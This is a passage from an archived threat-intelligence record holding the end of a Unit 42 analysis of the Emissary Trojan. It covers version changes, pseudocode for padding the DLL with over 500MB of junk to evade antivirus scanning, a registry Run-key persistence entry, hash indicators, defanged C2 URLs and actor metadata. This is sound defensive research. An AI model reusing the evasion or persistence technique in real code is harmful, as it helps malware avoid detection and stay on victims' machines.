out of a sub-function in an\nattempt to evade signatures used to detect the remote shell creation. For instance, in\nEmissary 5.1 the command handler would call an initial subfunction that would then call a\nsecond subfunction to carry out the activities to create and interact with the remote shell. In\n5.3, the command handler calls an initial subfunction that carries out the activities to create\nand interact with the remote shell.\n\n**Version 5.4**\n\n**Date: 11/23/2015**\n\nSHA256: 69b1d5454abe2475257defd9962a24a92411212c4f592de8765369a97f26c037\n(Base DLL with junk data removed)\n\nOriginal Name WinDLL.dll\n\n\n-----\n\n[Version 5.4 of Emissary was the basis for the blog ELISE: Security Through Obesity by](http://pwc.blogs.com/cyber_security_updates/2015/12/elise-security-through-obesity.html)\nMichael Yip of PWC. This blog provides a great analysis of this version of Emissary and we\nhighly suggest reading it to become familiar with the Trojan.\n\nThere is one difference in the functional code between Emissary versions 5.3 and 5.4, which\ninvolves the removal of the command '107' used to update the Trojan. The string '107' still\nexists within the Trojan, however, the command handler does not check the C2 response for\nthis command and the code used to update the Trojan has been removed.\n\nThe major difference between Emissary version 5.4 and all previous versions is how the\nTrojan is saved and loaded. First, the filenames of the various components of Emissary\nchanged to the following; however, the filename for debug logs has not changed:\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n%APPDATA%\\Programs\\Syncmgr.dll -> Loader Trojan\n\n%APPDATA%\\Programs\\60HGBC00.DAT -> Configuration File\n\n%APPDATA%\\Programs\\WEB2013BW6.DAT -> Emissary Trojan\n\n%TEMP%\\000A758C8FEAE5F.TMP -> Log file\n\n\nIn addition to file name changes, the biggest (pardon the pun) change involves the Loader\nTrojan (Syncmgr.dll) appending junk data to the end of the Emissary DLL file to make\nincredibly large files. The reason for creating such large files is to trick antivirus applications\ninto not scanning the file, as it could exceed the maximum size of files the antivirus can scan\n(even VirusTotal has a maximum file size of 128MB). For instance, the following pseudo code\ncontains two loops that will end up appending 524,288,000 bytes to the end of file, resulting\nin a DLL that exceeds 500MB in size:\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nWriteFile(hFile, buf_EmissaryDllFromResource, nNumberOfBytesToWrite,\n&nNumberOfBytesToWrite, 0);\nbuf_junkData = 0;\nret_time = time(0);\nsrand(ret_time);\nfor ( i = 0; i < 51200; ++i )\n{\nfor ( j = 0; j < 640; ++j )\n{\nrandom_byte = rand() % 255;\noffset_in_buff_junkData = &buf_junkData + 16 * j;\ndword_junkData = 0x1010101 * random_byte;\n*offset_in_buff_junkData = dword_junkData;\n*(offset_in_buff_junkData + 1) = dword_junkData;\n*(offset_in_buff_junkData + 2) = dword_junkData;\n*(offset_in_buff_junkData + 3) = dword_junkData;\n}\nWriteFile(hFile, &buf_junkData, 0x2800u, &nNumberOfBytesToWrite, 0);\n}\n\n\nWith the new filenames, malware persistence is achieved via the following registry key:\n\n1 HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Syncmgr: \"rundll32.exe\n\"C:\\Documents and Settings\\[username]>\\Application\nData\\Programs\\Syncmgr.dll\",Setting\"\n\n**Date: 11/24/2015**\n\nSHA256: bfceccdd553c7e26006bb044ea6d87e597c7cce08218068e31dc940e9f55b636\n(Base DLL with junk data removed)\n\nOriginal Name: WinDLL.dll\n\nIn another attempt to avoid detection based on PE header hashes, the Trojan was\nrecompiled without making any changes.\n\n## Conclusion\n\nThe actors using Emissary, who were previously reported as behind Operation Lotus\nBlossom, have been active for at least seven years in Southeast Asia. They are persistent,\nevolve over time, and have enough resources to have multiple custom RATs that receive\nregular updates. The targeting is largely military or government, with some cases of higher\neducation and high tech companies. They also have the ability to select and use appropriate\ndecoys in multiple Asian languages that appear legitimate.\n\n\n-----\n\nThe use of Emissary appears to be focused only on Taiwan and Hong Kong, with regular\nmalware updates to avoid detection and to increase the odds of success. Of particular note,\nthere is an interesting coincidence between the timing of the publication of our Operation\nLotus Blossom report and a flurry of Emissary updates. The first occurred ten days after\npublication and was followed by updates over increasingly shorter time frames, starting at\nroughly every three months and progressing to monthly by the final version discussed here.\nUntil that publication, according to our research Emissary was updated roughly every two\nyears. This indicates the threat actors may take note of threat intelligence reporting and are\nfully capable of making immediate changes when deemed necessary.\n\nIn addition to the malware evolution, the actors also shifted from solely spear-phishing\ntargets with attachments to also compromising legitimate websites to host malware. The\nconsistent updates to the Trojan and the shift in the actor’s TTPs suggests that this threat will\ncontinue to use Emissary in future espionage related attacks.\n\n[We have updated the Emissary tag for Palo Alto Networks AutoFocus users to track this](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Emissary)\nthreat using the indicators discussed in this blog.\n\n**Emissary Delivery Documents**\n\n42b8898c07374b1fc6a4a33441aadf10e47f226d9d3bf3368a459c0e221dff73\n\n37f752f89b0384291af23542efc08c01be962c04e3b2c881a8bc1f8771e9179f\n\n52b7f93bd4c2d1b1818f2a9506551852e2e7b511c9298e71edb54a39f69f94f2\n\n5cda2251059c34f55ac23941b56e248b9a1111e98f62c5a307eadbb9618592dd\n\n70097adba2743653bc73d0a2909a13f2904dbbcc1ffdb4e9013a8e61866abf5c\n\n9bb0288f7b98fac909ed91ec24dad0d5a31e3eec93a1641849d9dab56c23aa59\n\nb201c89fd7bdfc625bacfd4850feaa81269d9b41ed10ba1f7c0cb1339f4a6abe\n\nddbe42fb03bf9f4b9144396e814f13cd7054dcf238234dcb838fa9643136c03a\n\ne67d3cc1684c789c3bd02af7a68b783fd90dc6d2d660b174d533f4c0e07490f9\n\n0c550fad82f2653bc13d9629357a2a56df82602ee0ce96aa5a31f885e3aa29df\n\nf36b7f63f46ae6afe8882b34c1ec11597c8537a3a7fa8b6521a83308940cc77b\n\n**Emissary Installers/Loaders**\n\nfdcd10a2c2bf802ba5b6be55c16c0bf407bcbee902b66466b0f954d2951fad2d\n\nda29b647411153b49cbf4df862e3f36209eafb8ebe8b966429edec4fb15dbce9\n\n\n-----\n\n721676d529a0c439594502f1d53fec697adc80fa1301d2bf20c2600d99ceed4e\n\n0069029ee4029df88f700da335a06e0e3a534a94552fe966186166b526a20b6a\n\n9420017390c598ee535c24f7bcbd39f40eca699d6c94dc35bcf59ddf918c59ab\n\n26e2f4f9026f19156a73ffbfde438916f24d80b8812b6cebe98167eb9be0863c\n\n8e3b7dc3dca92d7458265e2bcd69caa558cbbf24bbbf1200b9aa924260c42480\n\ne817610b62ccd00bdfc9129f947ac7d078d97525e9628a3aa61027396dba419b\n\n02831316a3a04c1248605f28fb08d810230dd4411b2a1fc8187508aea6b449c5\n\n675869fac21a94c8f470765bc6dd15b17cc4492dd639b878f241a45b2c3890fc\n\n70561f58c9e5868f44169854bcc906001947d98d15e9b4d2fbabd1262d938629\n\n925d2f960d8db0510f3681c038311c0c2df86c5ba03f8cb61e3c8846c31bd6e1\n\n98fb1d2975babc18624e3922406545458642e01360746870deee397df93f50e0\n\na8b0d084949c4f289beb4950f801bf99588d1b05f68587b245a31e8e82f7a1b8\n\nb07fbb92484fd2aff6d28f0ab04d5f51e96420b6d670f921b0bbe0e5392da408\n\nc72b07f2a423abc4fc45dfddc5162b8eb1ea97d5b5e66811526433f09b6cdf41\n\ndd8ffb9f961299f7cc9cb51e17a5cccf79b7fb583e594b05ef93b54c8cad54f6\n\nfbcb401cf06326ab4bb53fb9f01f1ca647f16f926811ea66984f1a1b8cf2f7bb\n\ne21b47dfa9e250f49a3ab327b7444902e545bed3c4dcfa5e2e990af20593af6d\n\n**Emissary DLL Version 1.0 through 5.4**\n\na7d07b92e48876e2195e5d8769a47cf0a237e11ac304e41b14fc36042b0d9484\n\ne6c4611b1399ada920730686395d6fc1700fc39add3d0d40b4f784ccb6ad0c30\n\n931a1284b11a3997c7a99076d582ed3436aa30409dc73bd763436dddd490f9cb\n\n5edf2d0270f8e7eb5be3476802e46c578c4afc4b046411be0806b9acc3bfa099\n\n9dab2d1b16eb0fb4ec2095d4b4e2a3ad67a707ab4f54f9c26539619691f103f3\n\ndcbeca8c92d6d18f2faf385e677913dc8abac3fa3303c1f5cfe166180cffbed3\n\n5171c9a593389011da4d72125e52bf7ef86b2da7fcd6c2a2bc95467afe6a1b58\n\n\n-----\n\n70bed57bc3484fe5dbcf3c732bd7b11f80a742138f4733bc7e9b6d03e721da4a\n\nc145bb2e4ce77c79aa01de2aec4a8b5b0b680e23bceda2c230903b5f0e119634\n\n375190cc8e0e75cf771d66347ea2a04b6d1b59bf2f56823eb81270618f133e2d\n\ne369417a7623d73346f6dff729e68f7e057f7f6dae7bb03d56a7510cb3bfe538\n\n29d8dc863427c8e37b75eb738069c2172e79607acc7b65de6f8086ba36abf051\n\n46ad72811990c1937d26e1f80ec1b9def8c112817f4bb9f94e3d1e4f0fb86f80\n\nbfceccdd553c7e26006bb044ea6d87e597c7cce08218068e31dc940e9f55b636\n\n731cd2ce87f4c4375782de0686b5b16619f8fa2de188522cbc8e64f8851bb7ed\n\nacf7dc5a10b00f0aac102ecd9d87cd94f08a37b2726cb1e16948875751d04cc9\n\n**Emissary C2 URLs**\n\nhttp://101.55.121[.]79/lightserver/Default.aspx\n\nhttp://101.55.33[.]92/default.aspx\n\nhttp://101.55.33[.]92:80/default.aspx\n\nhttp://101.55.33[.]95:80/default.aspx\n\nhttp://103.243.24[.]179/Default.aspx\n\nhttp://118.193.221[.]233:80/default.aspx\n\nhttp://123.1.159[.]153/lightserver/Default.aspx\n\nhttp://123.1.159[.]210/lightserver/Default.aspx\n\nhttp://140.131.39[.]11/icanxp/help/help/default.aspx\n\nhttp://163.20.127[.]27/0test/test/default.aspx\n\nhttp://203.124.14[.]214/default.aspx\n\nhttp://203.124.14[.]229/default.aspx\n\nhttp://210.209.121[.]31/lightserver/default.aspx\n\nhttp://210.209.121[.]92/lightserver/Default.aspx\n\nhttp://210.209.121[.]92/weboffice/Default.aspx\n\nhttp://appletree.onthenetas[.]com/Default.aspx\n\nhttp://bluefield.byinter[.]net/lightserver/Default.aspx\n\nhttp://booking.passinggas[.]net/lightserver/Default.aspx\n\nhttp://chairman.OnTheNetAs[.]com/weboffice/Default.aspx\n\nhttp://dnt5b.myfw[.]us/Default.aspx\n\nhttp://dnt5b.myfw[.]us/default.aspx\n\nhttp://eventlog.findhere[.]org/Default.aspx\n\nhttp://grassland.OnTheNetAs[.]com/lightserver/Default.aspx\n\nhttp://groupspace.findhere[.]org/lightserver/Default.aspx\n\nhttp://photograph.myfw[.]us/lightserver/default.aspx\n\n\n-----\n\nhttp://ustar5.PassAs[.]us/Default.aspx\nhttp://ustar5.PassAs[.]us/default.aspx\nhttp://webonline.OnTheNetAs[.]com/lightserver/default.aspx\nhttp://www.danangqt[.]net:80/default.aspx\nhttp://zooboo.PassingGas[.]net/weboffice/Default.aspx\n\n**Emissary Campaign Codes**\n\n3test\n\nFJ201508\n\nlyk_WW\n\nA-1117a\n\nQPR-Z0330\n\nYUIO\n\nZGP-M\n\nxman\n\nA-1117a\n\nFlash\n\nFJ20151125\n\nYUIO\n\nll\n\nA-1231a\n\nux-2011\n\nRT101212\n\n111\n\nUPG-ZHG-01\n\nIC00001\n\n**Get updates from**\n\n**Palo Alto**\n\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\nStatement.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2016/2016-02-03 - Emissary Trojan Changelog- Did Operation Lotus Blossom Cause It to Evolve-.pdf"
    ],
    "report_names": [
        "2016-02-03 - Emissary Trojan Changelog- Did Operation Lotus Blossom Cause It to Evolve-.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a1ce86c2-3efc-4115-a85e-92c5fa461838",
            "created_at": "2022-10-25T16:47:55.561071Z",
            "updated_at": "2025-03-27T02:05:17.261424Z",
            "deleted_at": null,
            "main_name": "BRONZE ELGIN",
            "aliases": [
                "Lotus Blossom ",
                "Lotus Panda ",
                "Lstudio",
                "Spring Dragon ",
                "CTG-8171 "
            ],
            "source_name": "Secureworks:BRONZE ELGIN",
            "tools": [
                " Lzari",
                "Elise"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "2fa14cf4-969f-48bc-b68e-a8e7eedc6e98",
            "created_at": "2022-10-25T15:50:23.538608Z",
            "updated_at": "2025-03-27T02:00:55.495551Z",
            "deleted_at": null,
            "main_name": "Lotus Blossom",
            "aliases": [
                "Lotus Blossom",
                "DRAGONFISH",
                "Spring Dragon",
                "RADIUM",
                "Raspberry Typhoon"
            ],
            "source_name": "MITRE:Lotus Blossom",
            "tools": [
                "Elise"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "eaa8168f-3fab-4831-aa60-5956f673e6b3",
            "created_at": "2022-10-25T16:07:23.805824Z",
            "updated_at": "2025-03-27T02:02:09.986613Z",
            "deleted_at": null,
            "main_name": "Lotus Blossom",
            "aliases": [
                "ATK 1",
                "ATK 78",
                "Billbug",
                "Bronze Elgin",
                "CTG-8171",
                "Dragonfish",
                "Lotus Blossom",
                "Operation Lotus Blossom",
                "Red Salamander",
                "Spring Dragon",
                "Thrip"
            ],
            "source_name": "ETDA:Lotus Blossom",
            "tools": [
                "BKDR_ESILE",
                "Catchamas",
                "EVILNEST",
                "Elise",
                "Group Policy Results Tool",
                "Hannotog",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Mimikatz",
                "PsExec",
                "Rikamanu",
                "Sagerunex",
                "Spedear",
                "Syndicasec",
                "WMI Ghost",
                "Wimmie",
                "gpresult"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "87a20b72-ab72-402f-9013-c746c8458b0b",
            "created_at": "2023-01-06T13:46:38.293223Z",
            "updated_at": "2025-03-27T02:00:02.796483Z",
            "deleted_at": null,
            "main_name": "LOTUS PANDA",
            "aliases": [
                "Lotus BLossom",
                "Spring Dragon",
                "ST Group",
                "DRAGONFISH",
                "BRONZE ELGIN",
                "ATK1",
                "G0030",
                "Red Salamander"
            ],
            "source_name": "MISPGALAXY:LOTUS PANDA",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535756,
    "ts_updated_at": 1743041628,
    "ts_creation_date": 1653697999,
    "ts_modification_date": 1653697999,
    "files": {
        "pdf": "https://archive.orkl.eu/615b2813bc1d111640b030c0a405324dcd9481a6.pdf",
        "text": "https://archive.orkl.eu/615b2813bc1d111640b030c0a405324dcd9481a6.txt",
        "img": "https://archive.orkl.eu/615b2813bc1d111640b030c0a405324dcd9481a6.jpg"
    }
}